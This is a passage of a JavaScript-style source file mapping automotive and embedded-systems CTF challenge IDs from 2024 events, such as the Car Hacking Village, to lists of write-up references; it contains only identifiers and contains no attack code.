  'japan2024-7':  [WRITEUPS.official, WRITEUPS.laysakura],
  'japan2024-8':  [WRITEUPS.official, WRITEUPS.emeth],
  'japan2024-9':  [WRITEUPS.official, WRITEUPS.hamayan, WRITEUPS.laysakura],
  'japan2024-10': [WRITEUPS.official, WRITEUPS.kusano],
  'japan2024-11': [WRITEUPS.official, WRITEUPS.emeth],
  'japan2024-12': [WRITEUPS.official, WRITEUPS.hamayan],
  // Block Harbor / VicOne Automotive CTF 2024 — covered in detail by the official write-ups
  'auto2024-1':  [WRITEUPS.official],
  'auto2024-2':  [WRITEUPS.official],
  'auto2024-3':  [WRITEUPS.official],
  'auto2024-4':  [WRITEUPS.official],
  'auto2024-5':  [WRITEUPS.official],
  'auto2024-6':  [WRITEUPS.official],
  'auto2024-7':  [WRITEUPS.official],
  'auto2024-8':  [WRITEUPS.official],
  'auto2024-9':  [WRITEUPS.official],
  'auto2024-10': [WRITEUPS.official],
  'auto2024-11': [WRITEUPS.official],
  'auto2024-12': [WRITEUPS.official],
  // Car Hacking Village 2024 — covered by the official write-ups
  'chv2024-1': [WRITEUPS.official],
  'chv2024-2': [WRITEUPS.official],
  'chv2024-3': [WRITEUPS.official],
  'chv2024-4': [WRITEUPS.official],
  // Embedded Systems Village 2024
  'esv2024-1': [WRITEUPS.justin],
};
